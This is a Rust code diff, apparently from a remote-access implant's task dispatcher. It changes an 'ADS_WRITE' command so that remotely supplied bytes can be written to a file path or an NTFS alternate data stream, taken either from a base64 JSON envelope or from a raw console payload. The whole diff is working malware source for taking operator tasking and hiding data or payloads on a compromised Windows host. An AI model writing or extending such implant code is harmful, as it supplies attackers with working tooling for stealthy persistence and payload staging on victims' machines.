@@ -708,20 +708,31 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
 
         // ── ADS_WRITE ────────────────────────────────────────────────────────
         "ADS_WRITE" => {
-            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
-            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string();
-            let data = j.get("data").and_then(|v| v.as_str()).unwrap_or("");
+            // Accept the legacy Rust JSON envelope and the shared console
+            // format: args=<file>:<stream>, payload=<raw bytes>.
+            let (path, bytes) = if task.args.trim().starts_with('{') {
+                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+                let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string();
+                let data = j.get("data").and_then(|v| v.as_str()).unwrap_or("");
+                let bytes = match STANDARD.decode(data) {
+                    Ok(b) => b,
+                    Err(e) => {
+                        t.send_result(task.id, "", &format!("base64 decode: {}", e));
+                        return true;
+                    }
+                };
+                (path, bytes)
+            } else {
+                (task.args.trim().to_string(), task.payload.clone())
+            };
             if path.is_empty() {
                 t.send_result(task.id, "", "ADS_WRITE requires path");
                 return true;
             }
-            let bytes = match STANDARD.decode(data) {
-                Ok(b) => b,
-                Err(e) => {
-                    t.send_result(task.id, "", &format!("base64 decode: {}", e));
-                    return true;
-                }
-            };
+            if bytes.is_empty() {
+                t.send_result(task.id, "", "ADS_WRITE requires data");
+                return true;
+            }
             match std::fs::write(&path, &bytes) {
                 Ok(_)  => t.send_result(task.id,
                     &format!("[+] wrote {} bytes to {}", bytes.len(), path), ""),
